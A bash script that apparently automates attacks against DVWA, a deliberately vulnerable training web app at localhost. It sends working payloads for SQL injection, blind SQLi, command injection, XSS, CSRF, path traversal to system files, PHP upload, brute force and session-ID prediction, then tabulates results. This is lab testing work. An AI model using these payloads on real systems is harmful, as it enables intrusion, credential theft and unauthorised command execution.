#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
USER="${DVWA_USER:-admin}"
PASS="${DVWA_PASS:-password}"
COOKIE_FILE=".dvwa_cookies.txt"
DEEP_RESULTS_FILE="${DVWA_DEEP_RESULTS_FILE:-dvwa_deep_results.md}"

extract_token() {
  sed -nE "s/.*name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"].*/\1/p" | head -n1
}

fetch_page() {
  local path="$1"
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL$path"
}

setup_db() {
  local token
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/setup.php" | extract_token)
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/setup.php" \
    --data-urlencode "create_db=Create / Reset Database" \
    --data-urlencode "user_token=$token" >/dev/null
  echo "[OK] setup_db"
}

login() {
  local token out
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/login.php" | extract_token)
  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "Login=Login" \
    --data-urlencode "user_token=$token")
  grep -qi "login failed" <<<"$out" && { echo "[FAIL] login"; exit 1; }
  echo "[OK] login"
}

set_security() {
  local level="$1" token
  token=$(fetch_page "/security.php" | extract_token)
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/security.php" \
    --data-urlencode "security=$level" \
    --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$token" >/dev/null
  echo "[OK] set security=$level"
}

init_results() {
  cat > "$DEEP_RESULTS_FILE" <<'MD'
# DVWA Deep Vulnerability Results

| Vulnerability | Security | Payload Count | Positive Indicators | Status | Notes |
|---|---|---:|---:|---|---|
MD
}

add_row() {
  printf "| %s | %s | %s | %s | %s | %s |\n" "$1" "$2" "$3" "$4" "$5" "$6" >> "$DEEP_RESULTS_FILE"
}

# ---------- SQLi ----------
test_sqli() {
  local level="$1" positives=0 total=0 body payloads
  payloads=(
    "1' OR '1'='1"
    "1' OR 1=1#"
    "1' UNION SELECT user,password FROM users#"
    "1' AND 'a'='a"
  )
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/sqli/?id=$(python - <<PY
import urllib.parse
print(urllib.parse.quote('''$p'''))
PY
)&Submit=Submit")
    if grep -q "First name:" <<<"$body" && [[ $(grep -o "First name:" <<<"$body" | wc -l) -gt 1 ]]; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "SQL Injection (Classic)" "$level" "$total" "$positives" "WARN (vulnerable)" "Multiple-row behavior with SQLi payloads"
  else
    add_row "SQL Injection (Classic)" "$level" "$total" "$positives" "OK/UNCLEAR" "No clear SQLi indicator"
  fi
}

# ---------- Blind SQLi ----------
test_sqli_blind() {
  local level="$1" total=2 positives=0 t1 t2 dt
  t1=$(date +%s)
  fetch_page "/vulnerabilities/sqli_blind/?id=1&Submit=Submit" >/dev/null
  t2=$(date +%s)
  local base=$((t2-t1))

  t1=$(date +%s)
  fetch_page "/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(3)%23&Submit=Submit" >/dev/null || true
  t2=$(date +%s)
  local slow=$((t2-t1))

  dt=$((slow-base))
  [[ "$dt" -ge 2 ]] && positives=1
  if [[ "$positives" -gt 0 ]]; then
    add_row "Blind SQL Injection" "$level" "$total" "$positives" "WARN (vulnerable)" "Timing delta ${dt}s"
  else
    add_row "Blind SQL Injection" "$level" "$total" "$positives" "OK/UNCLEAR" "No significant timing delta"
  fi
}

# ---------- Command Injection ----------
test_cmdi() {
  local level="$1" positives=0 total=0 body
  local payloads=("127.0.0.1;id" "127.0.0.1&&whoami" "127.0.0.1|uname -a")
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" \
      --data-urlencode "ip=$p" --data-urlencode "Submit=Submit")
    if grep -qiE "uid=|linux|www-data|root" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "Command Injection" "$level" "$total" "$positives" "WARN (vulnerable)" "Shell output markers observed"
  else
    add_row "Command Injection" "$level" "$total" "$positives" "OK/UNCLEAR" "No shell markers"
  fi
}

# ---------- Reflected XSS ----------
test_xss_r() {
  local level="$1" positives=0 total=0 body
  local payloads=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>")
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/xss_r/?name=$(python - <<PY
import urllib.parse
print(urllib.parse.quote('''$p'''))
PY
)")
    if grep -Fq "$p" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "Reflected XSS" "$level" "$total" "$positives" "WARN (vulnerable)" "Payload reflected unencoded"
  else
    add_row "Reflected XSS" "$level" "$total" "$positives" "OK/UNCLEAR" "No raw reflection"
  fi
}

# ---------- Stored XSS ----------
test_xss_s() {
  local level="$1" total=3 positives=0 body marker
  for i in 1 2 3; do
    marker="DVWA_STORED_XSS_${level}_$i_$(date +%s)"
    curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/xss_s/" \
      --data-urlencode "txtName=<script>${marker}</script>" \
      --data-urlencode "mtxMessage=stored_$i" \
      --data-urlencode "btnSign=Sign Guestbook" >/dev/null
    body=$(fetch_page "/vulnerabilities/xss_s/")
    if grep -Fq "<script>${marker}</script>" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "Stored XSS" "$level" "$total" "$positives" "WARN (vulnerable)" "Persisted script markers found"
  else
    add_row "Stored XSS" "$level" "$total" "$positives" "OK/UNCLEAR" "No raw persisted scripts"
  fi
}

# ---------- CSRF ----------
test_csrf() {
  local level="$1" total=3 positives=0 body
  for pw in password pass123 Password123!; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/csrf/?password_new=$pw&password_conf=$pw&Change=Change")
    if grep -q "Password Changed" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  # restore known password
  fetch_page "/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" >/dev/null || true
  if [[ "$positives" -gt 0 ]]; then
    add_row "CSRF" "$level" "$total" "$positives" "WARN (vulnerable)" "Password changes accepted by forged-style requests"
  else
    add_row "CSRF" "$level" "$total" "$positives" "OK/UNCLEAR" "No password change on forged-style requests"
  fi
}

# ---------- LFI ----------
test_lfi() {
  local level="$1" positives=0 total=0 body
  local payloads=("../../../../../../etc/passwd" "../../../../../../etc/hosts" "../../../../../../proc/self/environ")
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/fi/?page=$(python - <<PY
import urllib.parse
print(urllib.parse.quote('''$p'''))
PY
)")
    if grep -qiE "root:x:|localhost|PATH=" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "File Inclusion (LFI/RFI)" "$level" "$total" "$positives" "WARN (vulnerable)" "System file markers observed"
  else
    add_row "File Inclusion (LFI/RFI)" "$level" "$total" "$positives" "OK/UNCLEAR" "No inclusion markers"
  fi
}

# ---------- Upload ----------
test_upload() {
  local level="$1" positives=0 total=0 body tmp file ext
  for ext in php phtml phar; do
    total=$((total+1))
    tmp=$(mktemp)
    file="dvwa_deep_upload_${ext}_$(date +%s).${ext}"
    printf '<?php echo "UP_%s"; ?>' "$ext" > "$tmp"
    body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/upload/" \
      -F "uploaded=@$tmp;filename=$file;type=application/octet-stream" \
      -F "Upload=Upload")
    rm -f "$tmp"
    if grep -qi "succesfully uploaded" <<<"$body"; then
      positives=$((positives+1))
    fi
  done
  if [[ "$positives" -gt 0 ]]; then
    add_row "Unrestricted File Upload" "$level" "$total" "$positives" "WARN (vulnerable)" "Executable extensions accepted"
  else
    add_row "Unrestricted File Upload" "$level" "$total" "$positives" "OK/UNCLEAR" "Executable extensions rejected"
  fi
}

# ---------- Brute ----------
test_brute() {
  local level="$1" i out blocked=0 total=20 positives=0
  for i in $(seq 1 20); do
    out=$(fetch_page "/vulnerabilities/brute/?username=admin&password=wrong${i}&Login=Login")
    if grep -qiE "too many|locked|rate" <<<"$out"; then
      blocked=1
    fi
  done
  [[ "$blocked" -eq 0 ]] && positives=1
  if [[ "$positives" -gt 0 ]]; then
    add_row "Weak Brute-Force Protection" "$level" "$total" "$positives" "WARN (vulnerable)" "20 rapid attempts with no lockout/rate-limit markers"
  else
    add_row "Weak Brute-Force Protection" "$level" "$total" "$positives" "OK/UNCLEAR" "Lockout/rate-limit indicator observed"
  fi
}

# ---------- Weak Session ID ----------
test_weak_id() {
  local level="$1" headers v values=() i total=15 positives=0
  for i in $(seq 1 15); do
    headers=$(curl -fsSI -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/weak_id/")
    v=$(grep -i '^set-cookie: dvwaSession=' <<<"$headers" | sed -E 's/.*dvwaSession=([^;]+).*/\1/I' | tail -n1)
    [[ -n "${v:-}" ]] && values+=("$v")
  done
  if [[ "${#values[@]}" -ge 5 ]]; then
    # Detect simple monotonic numeric sequence
    local monotonic=1
    for i in $(seq 1 $((${#values[@]}-1))); do
      if ! [[ "${values[$((i-1))]}" =~ ^[0-9]+$ && "${values[$i]}" =~ ^[0-9]+$ ]]; then
        monotonic=0; break
      fi
      if [[ $((values[i])) -ne $((values[i-1]+1)) ]]; then
        monotonic=0; break
      fi
    done
    [[ "$monotonic" -eq 1 ]] && positives=1
  fi
  if [[ "$positives" -gt 0 ]]; then
    add_row "Weak Session ID" "$level" "$total" "$positives" "WARN (vulnerable)" "Predictable monotonic dvwaSession sequence"
  else
    add_row "Weak Session ID" "$level" "$total" "$positives" "OK/UNCLEAR" "No strict monotonic numeric sequence"
  fi
}

run_suite_for_level() {
  local level="$1"
  set_security "$level"
  test_sqli "$level"
  test_sqli_blind "$level"
  test_cmdi "$level"
  test_xss_r "$level"
  test_xss_s "$level"
  test_csrf "$level"
  test_lfi "$level"
  test_upload "$level"
  test_brute "$level"
  test_weak_id "$level"
}

full() {
  init_results
  setup_db
  login

  # Deep run at low and medium to compare behavior.
  run_suite_for_level low
  run_suite_for_level medium

  echo "[OK] deep run complete -> $DEEP_RESULTS_FILE"
}

case "${1:-}" in
  full) full ;;
  *) echo "Usage: $0 {full}"; exit 1 ;;
esac
